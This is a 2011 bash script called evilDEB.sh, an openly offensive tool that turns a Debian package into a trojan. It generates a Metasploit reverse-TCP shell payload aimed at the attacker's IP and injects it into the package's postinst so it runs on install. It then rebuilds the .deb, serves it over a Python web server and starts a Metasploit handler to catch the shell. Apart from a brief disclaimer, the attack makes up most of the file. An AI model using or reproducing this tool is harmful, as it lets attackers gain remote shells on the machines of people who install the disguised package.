#!/bin/bash
#----------------------------------------------------------------------------------------------#
#evilDEB.sh v0.2 (#2 2011-04-05)                                                               #
# (C)opyright 2011 - g0tmi1k                                                                   #
#---Important----------------------------------------------------------------------------------#
#                     *** Do NOT use this for illegal or malicious use ***                     #
#                By running this, YOU are using this program at YOUR OWN RISK.                 #
#            This software is provided "as is", WITHOUT ANY guarantees OR warranty.            #
#---Default Settings---------------------------------------------------------------------------#
# [Interface] Which interface to use.
interface="wlan0"

#---Default Variables--------------------------------------------------------------------------#
    debFile=""
       port=$(shuf -i 2000-65000 -n 1)
    verbose="0"              # Shows more info. 0=normal, 1=more , 2=more+commands
        svn="21"             # SVN Number
    version="0.2 (#2)"       # Program version
trap 'cleanUp interrupt' 2   # Interrupt - "Ctrl + C"

#----Functions---------------------------------------------------------------------------------#
function action() { #action title command #screen&file #x|y|lines #hold
   error="free"
   if [ -z "$1" ] || [ -z "$2" ]; then error="1"; fi # Coding error
   if [ ! -z "$3" ] && [ "$3" != "true" ] && [ "$3" != "false" ]; then error="3"; fi
   if [ ! -z "$5" ] && [ "$5" != "true" ] && [ "$5" != "false" ]; then error="5"; fi

   if [ "$error" != "free" ]; then
      display error "action Error code: $error" 1>&2
      return 1
   fi
   #----------------------------------------------------------------------------------------------#
   command="$2"
   if [ ! -e "/usr/bin/xterm" ] || [ ! "$4" ]; then
      if [ "$verbose" == "2" ]; then echo "eval $command"   #Command:
      else command="$command 2> /dev/null"; fi              # Hides output
      eval "$command"
   else
      xterm="xterm"   #Defaults
      x="100"; y="0"
      lines="15"
      if [ "$5" == "true" ]; then xterm="$xterm -hold"; fi
      if [ "$verbose" == "2" ]; then echo "$command"; fi   #Command:
      if [ "$4" ]; then
         x=$(echo $4 | cut -d '|' -f1)
         y=$(echo $4 | cut -d '|' -f2)
         lines=$(echo $4 | cut -d '|' -f3)
      fi
      $xterm -geometry 100x$lines+$x+$y -T "evilDEB v$version - $1" -e "$command"
   fi
   return 0
}
function cleanUp() { #cleanUp #mode
   if [ "$1" == "nonuser" ]; then exit 3;
   elif [ "$1" != "clean" ]; then
      display action "Configuring: Environment"
      action "Killing programs" "killall -9 python"
      if [ "$(pgrep xterm)" ]; then killall -9 xterm; fi   # Cleans up any running xterms
   fi

   if [ "$stage" != "done" ]; then
      if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ]; then display action "Removing: Temp files"; fi
      action "Removing files" "rm -rf \"$(pwd)/tmp/\""
   fi

    if [ "$1" != "remove" ]; then
      echo -e "\e[01;36m[*]\e[00m Done! =)"
      exit 0
   fi
}
function help() { #help
   echo "(C)opyright 2011 g0tmi1k ~ http://g0tmi1k.blogspot.com

 Usage: bash evilDEB.sh -i [interface] -d [/path/to/file]


  Options:
   -i [interface]     ---  interface e.g. $interface
   -d [/path/to/file] ---  DEB file to use e.g. ~/my.deb

   -v                 ---  Verbose          (Displays more)
   -V                 ---  (Higher) Verbose (Displays more + shows commands)

   -u                 ---  Checks for an update
   -?                 ---  This screen


  Example:
   bash evilDEB.sh
   bash evilDEB.sh -i wlan0 -d my.deb


 Known issues:
    -Doesn't work with every DEB file
"
   exit 1
}
function display() { #display type message
   error="free"
   if [ -z "$1" ] || [ -z "$2" ]; then error="1"; fi # Coding error
   if [ "$1" != "action" ] && [ "$1" != "info" ] && [ "$1" != "diag" ] && [ "$1" != "error" ]; then error="5"; fi # Coding error

  if [ "$error" != "free" ]; then
      display error "display Error code: $error" 1>&2
      return 1
   fi
   #----------------------------------------------------------------------------------------------#
   if [ "$1" == "action" ];  then output="\e[01;32m[>]\e[00m"
   elif [ "$1" == "more" ];  then output="\e[01;33m[>]\e[00m"
   elif [ "$1" == "info" ];  then output="\e[01;33m[i]\e[00m"
   elif [ "$1" == "diag" ];  then output="\e[01;34m[+]\e[00m"
   elif [ "$1" == "error" ]; then output="\e[01;31m[!]\e[00m"; fi
   #elif [ "$1" == "input" ];  then output="\e[00;33m[~]\e[00m"
   #elif [ "$1" == "msg" ];    then output="\e[01;30m[i]\e[00m"
   #elif [ "$1" == "option" ]; then output="\e[00;35m[-]\e[00m"
   output="$output $2"
   echo -e "$output"

   return 0
}
function update() { #update
   display action "Checking for an update"
   command=$(wget -qO- "http://g0tmi1k.googlecode.com/svn/trunk/" | grep "<title>g0tmi1k - Revision" | awk -F " " '{split ($4,A,":"); print A[1]}')
   if [ "$command" ] && [ "$command" -gt "$svn" ]; then
      display info "Updating"
      wget -q -N "http://g0tmi1k.googlecode.com/svn/trunk/evilDEB/evilDEB.sh"
      display info "Updated! =)"
   elif [ "$command" ]; then display info "You're using the latest version. =)"
   else display info "No internet connection"; fi
}


#---Main---------------------------------------------------------------------------------------#
echo -e "\e[01;36m[*]\e[00m evilDEB v$version"
stage="setup"

#----------------------------------------------------------------------------------------------#
if [ "$(id -u)" != "0" ]; then display error "Run as root" 1>&2; cleanUp nonuser; fi

#----------------------------------------------------------------------------------------------#
while getopts "d:i:vVuh?" OPTIONS; do
   case ${OPTIONS} in
      d   ) debFile=$OPTARG;;
      i   ) interface=$OPTARG;;
      v   ) verbose="1";;
      V   ) verbose="2";;
      u   ) update;;
      ?|h ) help;;
  esac
done
ourIP=$(ifconfig $interface | awk '/inet addr/ {split ($2,A,":"); print A[2]}')

#----------------------------------------------------------------------------------------------#
display action "Analyzing: Environment"

#----------------------------------------------------------------------------------------------#
if [ -z "$debFile" ]; then display error "No DEB file loaded" 1>&2; display info "Switching to default DEB (xbomb)"; fi
if [ "$debFile" ] && [ ! -e "$debFile" ]; then display error "There isn't a DEB file located at: $debFile" 1>&2; display info "Switching to default DEB (xbomb)"; fi
if [ -z "$interface" ]; then display error "interface can't be blank" 1>&2; cleanUp; fi
if [ "$verbose" != "0" ] && [ "$verbose" != "1" ] && [ "$verbose" != "2" ]; then display error "verbose ($verbose) isn't correct" 1>&2; verbose="0"; fi
if [ -z "$ourIP" ]; then display error "Haven't got an IP address on $interface" 1>&2; cleanUp; fi

#----------------------------------------------------------------------------------------------#
cleanUp remove
mkdir -p "$(pwd)"/tmp/extracted/{DEBIAN,tmp}

#----------------------------------------------------------------------------------------------#
if [ "$debFile" == "" ]; then
   display action "Downloading: xbomb_2.1a-7_i386.deb"
   action "Downloading DEB" "wget -P \"$(pwd)/tmp/\" http://archive.ubuntu.com/ubuntu/pool/universe/x/xbomb/xbomb_2.1a-7.1_i386.deb"
   debFile="xbomb_2.1a-7.1_i386.deb"
else
   cp "$debFile" "\"$(pwd)/tmp/\""
fi

#----------------------------------------------------------------------------------------------#
display action "Extracting: DEB ($debFile)"
action "Extracting" "dpkg -x \"$(pwd)/tmp/$debFile\" \"$(pwd)/tmp/extracted/\"; ar p \"$(pwd)/tmp/$debFile\" \"control.tar.gz\" | tar zx -C \"$(pwd)/tmp/extracted/DEBIAN/\""

#----------------------------------------------------------------------------------------------#
display action "Creating: Payload"
action "Creating Payload" "msfpayload linux/x86/shell_reverse_tcp LHOST=$ourIP LPORT=$port X > \"$(pwd)/tmp/extracted/tmp/evilDEB\""

#----------------------------------------------------------------------------------------------#
display action "Injecting: Payload (Remote linux shell)"
command=""
if [ ! -e "$(pwd)/tmp/extracted/DEBIAN/postinst" ]; then command="#! /bin/sh\n"; fi
echo -e "$command \nsudo chmod 2755 \"$(pwd)/tmp\" && nohup \"$(pwd)/tmp\" >/dev/null 2>&1 &" >> "$(pwd)/tmp/extracted/DEBIAN/postinst"

#----------------------------------------------------------------------------------------------#
display action "Creating: (Evil) DEB (evilDEB-${debFile##*/})"
action "Creating DEB" "chmod 755 \"$(pwd)/tmp/extracted/DEBIAN/postinst\"; dpkg-deb --build \"$(pwd)/tmp/extracted\" && mv \"$(pwd)/tmp/extracted.deb\" \"$(pwd)\"/tmp/evilDEB-${debFile##*/}; rm -rf \"$(pwd)\"/tmp/extracted \"$(pwd)\"/tmp/$debFile"
stage="done"

#----------------------------------------------------------------------------------------------#
display action "Running: Web server (http://$ourIP:80)"
cd "$(pwd)/tmp" && python -m SimpleHTTPServer 80 & sleep 3 && cd ".."

#----------------------------------------------------------------------------------------------#
display action "Running: Metasploit"
msfcli exploit/multi/handler PAYLOAD=linux/x86/shell/reverse_tcp LHOST=$ourIP LPORT=$port E

#----------------------------------------------------------------------------------------------#
cleanUp clean
